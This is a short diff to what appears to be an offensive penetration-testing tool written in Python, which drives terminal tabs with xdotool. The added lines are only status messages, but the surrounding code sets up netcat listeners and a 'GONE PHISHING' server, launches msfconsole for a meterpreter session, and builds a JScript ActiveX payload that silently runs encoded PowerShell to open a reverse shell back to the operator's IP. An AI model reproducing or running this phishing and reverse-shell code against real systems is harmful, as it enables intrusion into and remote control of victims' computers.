@@ -1246,6 +1246,7 @@ while True:
          command("xdotool type 'clear; cat " + dataDir + "/banner1.txt'; xdotool key Return")
          command("xdotool type 'python3 -m http.server --bind " + localIP + " " + HTTP + "'; xdotool key Return")
          command("xdotool key Ctrl+Tab")      
+         print("[+] HTTP server started, use " + localIP +  ":" + HTTP + " to connect...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -2867,7 +2868,6 @@ while True:
          checkParams = 1
       
       if checkParams != 1:    
-
          print("[*] Starting phishing server...")      
          command("xdotool key Ctrl+Shift+T")
          command("xdotool key Alt+Shift+S; xdotool type 'GONE PHISHING'; xdotool key Return")
@@ -2875,6 +2875,7 @@ while True:
          command("xdotool type 'rlwrap nc -nvlp " + checkParams + "'; xdotool key Return")
          command("xdotool key Ctrl+Tab")      
       
+         print("[*] Creating the phishing exploit...")      
          payLoad = f"""      
          a=new ActiveXObject("WScript.Shell");
          a.run("powershell -nop -w 1 -enc {powershell(localIP, checkParams)}", 0);window.close();
@@ -3316,6 +3317,8 @@ while True:
          command("xdotool key Alt+Shift+S; xdotool type 'METERPRETER SHELL'; xdotool key Return")
          command("xdotool type 'msfconsole -r meterpreter.rc'; xdotool key Return")
          command("xdotool key Ctrl+Tab")
+         
+         print("[+] Reverse shell started, use 'win_https_reverse_shell.exe' to connect..")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
